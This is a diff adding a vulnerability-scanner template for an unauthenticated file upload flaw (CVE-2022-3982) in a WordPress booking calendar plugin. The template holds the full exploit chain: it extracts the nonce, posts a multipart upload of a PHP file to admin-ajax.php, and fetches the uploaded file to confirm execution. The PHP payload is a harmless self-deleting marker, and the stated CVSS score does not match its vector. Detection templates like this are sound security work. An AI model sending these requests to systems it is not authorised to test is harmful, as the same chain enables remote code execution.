@@ -1,0 +1,82 @@
+id: wordpress-booking-calendar-file-upload
+info:
+  name: WordPress Booking Calendar File Upload Vulnerability (CVE-2022-3982)
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    WordPress Booking Calendar plugin versions before 3.2.2 allow unauthenticated users to upload arbitrary files, which can lead to remote code execution (RCE).
+  reference:
+    - https://wpscan.com/vulnerability/4d91f3e1-4de9-46c1-b5ba-cc55b7726867
+  classification:
+    cve-id: CVE-2022-3982
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.0
+
+variables:
+  random_file_name: "{{rand_text_alphanumeric(6)}}"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"ajaxNonce":"'
+        part: body
+    extractors:
+      - type: regex
+        name: ajax_nonce
+        internal: true
+        group: 1
+        regex:
+          - '"ajaxNonce":"(.*?)"'
+
+  - raw:
+      - |
+        POST /wp-admin/admin-ajax.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=------------------------95cedb90c1c905f6
+
+        --------------------------95cedb90c1c905f6
+        Content-Disposition: form-data; name="action"
+        
+        wpdevart_form_ajax
+        --------------------------95cedb90c1c905f6
+        Content-Disposition: form-data; name="wpdevart_id"
+        
+        x
+        --------------------------95cedb90c1c905f6
+        Content-Disposition: form-data; name="wpdevart_nonce"
+        
+        {{ajax_nonce}}
+        --------------------------95cedb90c1c905f6
+        Content-Disposition: form-data; name="wpdevart_data"
+        
+        {"wpdevart-submit":"X"}
+        --------------------------95cedb90c1c905f6
+        Content-Disposition: form-data; name="wpdevart-submit"
+        
+        1
+        --------------------------95cedb90c1c905f6
+        Content-Disposition: form-data; name="file"; filename="{{random_file_name}}.php"
+        Content-Type: application/octet-stream
+        
+        <?php echo md5(131);unlink(__FILE__);?>
+        --------------------------95cedb90c1c905f6--
+
+  - raw:
+      - |
+        GET /wp-content/uploads/booking_calendar/{{random_file_name}}.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "1afa34a7f984eeabdbb0a7d494132ee5"
+        part: body
+      - type: status
+        status:
+          - 200
